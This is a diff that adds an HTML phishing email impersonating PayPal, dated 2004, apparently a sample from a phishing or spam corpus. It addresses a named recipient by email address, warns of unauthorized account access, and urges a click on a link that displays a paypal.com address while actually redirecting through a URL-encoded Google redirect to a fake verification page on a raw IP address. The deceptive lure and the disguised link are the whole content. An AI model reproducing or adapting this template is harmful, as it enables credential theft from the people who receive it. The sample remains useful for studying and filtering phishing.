@@ -1,0 +1,143 @@
+
+
+<html>
+<head>
+<STYLE type=text/css>
+#message .dummy {}
+#message, #message TD {font-family: verdana,arial,helvetica,sans-
+serif;font-size: 12px;color: #000000;}
+#message LI {line-height: 120%;}
+#message UL.pp narrow {margin:10px 5px 0px 40px;}
+#message BR.h6 {font-size: 6px; line-height: 6px;}
+#message .pp normal {font-family: verdana,arial,helvetica,sans-
+serif;font-size: 12px;color: #000000;}
+#message .ppem106 {font-size: 13px; font-family: 
+verdana,arial,helvetica,sans-serif; font-weight: 700;}
+#message .pp label {font-family: verdana,arial,helvetica,sans-
+serif;font-size: 10px;font-weight: bold;color: #000000;}
+#message .pp heading {font-family: verdana,arial,helvetica,sans-
+serif;font-size: 18px;font-weight: bold;color: #003366;} 
+#message .pp subheading {font-family: verdana,arial,helvetica,sans-
+serif;font-size: 16px;font-weight: bold;color: #003366;} 
+#message .pp sidebartext {font-family: verdana,arial,helvetica,sans-
+serif;font-size: 11px;color: #003366;} 
+#message .pp sidebartextbold {font-family: 
+verdana,arial,helvetica,sans-serif;font-size: 11px;font-weight: 
+bold;color: #003366;} 
+#message .pp footer black {font-family: verdana,arial,helvetica,sans-
+serif;font-size: 11px;color: #000000;}
+#message .pp footer {font-family: verdana,arial,helvetica,sans-
+serif;font-size: 11px;color: #aaaaaa;}
+#message .pp button {font-size: 13px; font-family: 
+verdana,arial,helvetica,sans-serif; font-weight: 400; border-
+style:outset; color:#000000; background-color: #cccccc;}
+#message .pp smaller {font-family: verdana,arial,helvetica,sans-
+serif;font-size: 10px;color: #000000;}
+</STYLE>
+
+<title>PayPal - Account Access Limited</title>
+</head>
+<xbody>
+<table width="600" cellspacing="0" cellpadding="0" border="0" 
+align="center">
+ <tr>
+  <td><A target=" blank"  
+href="https://www.paypal.com/" ><IMG 
+src="http://www.paypal.com/images/paypal logo.gif"  width=117 
+height=35 alt="PayPal" border="0" vspace=10></A>
+  </td>
+ </tr>
+</table>
+<table width="100%" cellspacing="0" cellpadding="0" border="0">
+ <tr>
+  <td 
+background="http://www.paypal.com/images/bg clk.gif"  
+width=100%><img src="http://www.paypal.com/images/pixel.gif"  
+height="29" width="1" border="0"></td>
+ </tr> 
+ <tr>
+  <td><img 
+src="http://www.paypal.com/images/pixel.gif"  height="10" width="1" 
+border="0"></td>
+ </tr>
+</table>
+
+<table width="600" cellpadding=0 cellspacing=0 border=0 
+align=center>
+ <tr valign=top>
+  <td width=5><img 
+src="http://www.paypal.com/images/pixel.gif"  width=5 height=1></td>
+  <td width="100%" class="pptext" align="left">
+   <table width="100%" cellspacing="0" 
+cellpadding="0" border="0" align="center">
+    <tr>
+     <td>
+      
+
+      <br><br>
+      
+      
+        
+ 
+Dear Robert.mcclenon@verizon.net, 
+<br><br>      
+We recently reviewed your account, and suspect that your PayPal 
+account may<br>
+have been accessed by an unauthorized third party. Protecting the 
+security<br>
+of your account and of the PayPal network is our primary 
+concern.<br>
+Therefore, as a prevention measure, we have temporarely limited 
+access to<br>
+sensitive PayPal account features.<br>
+Please click on the link below to confirm your information:<br><p>
+<a 
+href="http://www.google.com/url?q=%68%74%74%70%3a%2f%2f61.
+33.179.58/.paypal/.verification/hide/index2.htm">https://www.paypal.co
+m/cgi-bin/webscr?cmd= login-
+run?USER=Robert.mcclenon@verizon.net</a><br>
+   <br>
+For more information about how to protect your account, please 
+visit<br>
+PayPal's Security Center, accessible via the "Security Center" link 
+located<br>
+at the bottom of each page of the PayPal website. <br>
+<br>
+We apologize for any inconvenience this may cause, and appreciate 
+your<br>
+assistance in helping us maintain the integrity of the entire PayPal<br>
+system. Thank you for your prompt attention to this matter.<br>
+<br>
+<br><br>
+
+Sincerely,
+<br><br>
+
+The PayPal Fraud Management Team 
+<br>
+</td>
+
+    <tr>
+     <td><br><img 
+src="http://www.paypal.com/images/dot row long.gif"  width=590 
+height=5></td>
+    </tr> 
+    <tr>
+        
+  <td class="pp footer">
+Please do not reply to this e-mail. Mail sent to this address cannot be
+answered. For assistance, log in to your PayPal account and choose 
+the
+"Help" link in the header of any page.<br>
+ 
+Copyright  2004 PayPal, Inc. All rights reserved. Designated 
+trademarks and brands are the property of their respective owners.
+
+     </td>
+    </tr>
+   </table>
+  </td>
+ </tr>
+</table>
+</xbody>
+</html>
